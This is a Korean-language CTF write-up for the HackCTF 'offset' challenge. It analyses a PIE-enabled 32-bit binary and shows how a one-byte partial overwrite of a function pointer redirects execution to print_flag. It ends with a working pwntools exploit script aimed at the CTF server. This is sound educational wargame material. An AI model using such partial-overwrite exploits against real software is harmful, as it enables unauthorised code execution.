**HackCTF - offset**

| layout | title            | auther   | categories | tags           |
| ------ | ---------------- | -------- | ---------- | -------------- |
| post   | HackCTF - offset | Y3oj4eng | writeup    | writeupwargame |



# Analysis

---

`file` 명령어를 통해 해당 바이너리의 정보를 획득한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file offset 
offset: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=c3936da4c051f1ca58585ee8b243bc9c4a37e437, not stripped

```

`32 bit ELF` 프로그램이며 `not-stripped` 이다.

`checksec`명령어를 통해 해당 `binary`에 적용된 `mitigation`을 확인한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ checksec offset 
[*] '/home/mac/Desktop/hackCTF/offset'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`Full RELRO` & `NX` & `PIE` 보호기법이 적용되었다.

`NX`가 적용되어 `heap`, `stack`등과 같은 메모리에 실행 권한이 사라지며 `PIE`기법이 적용되어 메모리 상 모든 영역이 랜덤으로 매핑된다. 

왜 이름이 `offset`인지 느낌이 온다.

일단 `binary`를 실행 시켜보도록 한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./offset 
Which function would you like to call?
aaaaaaaaaaaaaaaaaaaaaaaaaa

```

`binary`를 실행시키면 `Which function would you like to call?`이라는 문자열을 출력하고 사용자로부터 입력을 받는다.

분석시 해당 `binary` 내 함수들을 유심히 봐야겠다.

이제 분석을 진행한다.

![image](https://user-images.githubusercontent.com/33051018/75871241-99900000-5e4f-11ea-8dc1-aee51ae3ca20.png)

`IDA`로 열자마자 `Function Window`부터 살펴보았다.

`print_flag`라는 의미심장한 이름의 함수가 있었다. 

`main`함수를 분석한 뒤, 해당 함수를 살펴보도록 한다.

![image](https://user-images.githubusercontent.com/33051018/75871414-deb43200-5e4f-11ea-8964-5a074ae2d3a2.png)

`main`함수이다.

버퍼를 초기화 한 뒤, 아까 봤던 문자열 `Which function would you like to call?`을 출력한다.

이후 `s`변수에 `gets`함수를 통해 값을 입력받는다.

`s`변수는 `ebp-0x27`에 위치하고 있으나 입력을 받을때 길이값을 검증하지 않아 `BOF`취약점이 존재한다.

이후 입력받은 `s`를 참조하여 `select_func`의 인자로 전달한 뒤 프로그램을 종료한다.

`select_func`함수를 살펴보도록 한다.

![image](https://user-images.githubusercontent.com/33051018/75871647-3a7ebb00-5e50-11ea-8cb5-b55cd0263bde.png)

`v3`는 함수형 포인터로써 `two`함수의 주소를 참조하도록 초기화한다.

이후 `select_func`은 전달받은 인자 `src`를 `dest`에 `31bytes`만큼 복사한다.

다음으로 분기를 통해 `dest`값을 `one`과 비교하여 만일 같으면 `v3`변수가 `one()`을 참조하도록 초기화하여 `v3`를 호출하고 다르면 그냥 `v3`를 호출한다.

**결론적으로 `select_func` 함수가 호출하는 함수의 주소는 `v3`에 담긴다.** 

아까 잠시 보고 지나갔던 `print_flag()` 함수를 살펴본다.

![image](https://user-images.githubusercontent.com/33051018/75872295-3bfcb300-5e51-11ea-9054-422d3b9ba8f3.png)

해당 함수는 `flag.txt`함수를 읽어서 출력해주는 함수이다.

따라서, `v3` 함수형 포인터가 `print_flag` 함수를 참조할 수 있도록 프로그램의 흐름을 변조하면 될 것 같다.

또한, `select_func`에서 `dest`와 `v3`의 사이 거리는 30bytes다.

이후 `strncpy`를 이용해 복사하는 데이터의 크기는 31bytes다. 따라서 우리는 호출하는 함수의 1byte만 덮어씌울수 있다.

```bash
gdb-peda$ pd select_func
Dump of assembler code for function select_func:
   0x0000077f <+0>:	push   ebp
   0x00000780 <+1>:	mov    ebp,esp
   0x00000782 <+3>:	push   ebx
   0x00000783 <+4>:	sub    esp,0x34
   0x00000786 <+7>:	call   0x5b0 <__x86.get_pc_thunk.bx>
   0x0000078b <+12>:	add    ebx,0x182d
   0x00000791 <+18>:	lea    eax,[ebx-0x190b]
   0x00000797 <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000079a <+27>:	sub    esp,0x4
   0x0000079d <+30>:	push   0x1f
   0x0000079f <+32>:	push   DWORD PTR [ebp+0x8]
   0x000007a2 <+35>:	lea    eax,[ebp-0x2a]
   0x000007a5 <+38>:	push   eax
   0x000007a6 <+39>:	call   0x550 <strncpy@plt>
   0x000007ab <+44>:	add    esp,0x10
   0x000007ae <+47>:	sub    esp,0x8
   0x000007b1 <+50>:	lea    eax,[ebx-0x1675]
   0x000007b7 <+56>:	push   eax
   0x000007b8 <+57>:	lea    eax,[ebp-0x2a]
   0x000007bb <+60>:	push   eax
   0x000007bc <+61>:	call   0x4d0 <strcmp@plt>
   0x000007c1 <+66>:	add    esp,0x10
   0x000007c4 <+69>:	test   eax,eax
   0x000007c6 <+71>:	jne    0x7d1 <select_func+82>
   0x000007c8 <+73>:	lea    eax,[ebx-0x1864]
   0x000007ce <+79>:	mov    DWORD PTR [ebp-0xc],eax
   0x000007d1 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x000007d4 <+85>:	call   eax
   0x000007d6 <+87>:	nop
   0x000007d7 <+88>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000007da <+91>:	leave  
   0x000007db <+92>:	ret
```

`select_func` +85 부분이 `v3` 함수를 호출하는 부분이다.

해당 부분에 `breakpoint`를 걸고 `eax`값을 살펴본다.

![image](https://user-images.githubusercontent.com/33051018/75874952-21790880-5e56-11ea-8524-becd2929109e.png)

`eax`에는 `0x56555600` 값이 들어가있다.

궁극적으로 실행시켜야할 함수 `print_flag`의 주소는 `0x565556d8` 이다.

두 주소를 비교해보면 맨 끝자리 2개 즉, 첫 한 바이트만 차이난다.

따라서, 페이로드의 구성은 30개의 더미와 `print_flag`함수의 첫주소인 `0xd8`을 조합하여 전달한다.

# Explolit

---

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3007)
#p = process('./offset')

payload = 'A'*30
payload += '\xd8'

p.recvuntil('Which function would you like to call?\n')
p.sendline(payload)

p.interactive()
```
~~vscode github push test~~